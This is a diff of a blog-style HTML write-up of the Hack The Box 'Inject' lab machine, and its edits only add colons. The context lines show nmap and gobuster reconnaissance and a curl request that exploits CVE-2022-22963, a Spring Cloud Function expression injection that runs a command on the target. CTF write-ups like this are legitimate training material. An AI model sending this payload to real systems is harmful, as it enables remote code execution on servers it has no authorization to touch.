@@ -163,7 +163,7 @@
         <p>The <code>Inject</code> machine is an easy linux box.</p>
 <p><img src="/images/Inject.png#center" alt="Scenario 1: Across columns"></p>
 <h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>I do a scan with <code>nmap</code></p>
+<p>I do a scan with <code>nmap</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ nmap -A -sV -sC 10.129.147.219 
 </span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-03-14 17:24 EDT
@@ -184,7 +184,7 @@
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.22 seconds
 </span></span></code></pre></div><h2 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>I do a directory enumeration with <code>gobuster</code></p>
+<p>I do a directory enumeration with <code>gobuster</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.129.147.219:8080/  -w  /usr/share/wordlists/dirb/big.txt
 </span></span><span style="display:flex;"><span>
@@ -310,7 +310,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[Install]
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">WantedBy=multi-user.target
-</span></span></span></code></pre></div><p>I have discover a service <code>Spring WEb APP</code>, I find a <code>CVE</code> to this service <code>[CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)</code></p>
+</span></span></span></code></pre></div><p>I have discover a service <code>Spring WEb APP</code>, I find a <code>CVE</code> to this service <code>[CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ curl -X POST  http://10.10.11.204:8080/functionRouter -H <span style="color:#e6db74">&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/pwned&#34;)&#39;</span> --data-raw <span style="color:#e6db74">&#39;data&#39;</span> -v
 </span></span><span style="display:flex;"><span>Note: Unnecessary use of -X or --request, POST is already inferred.
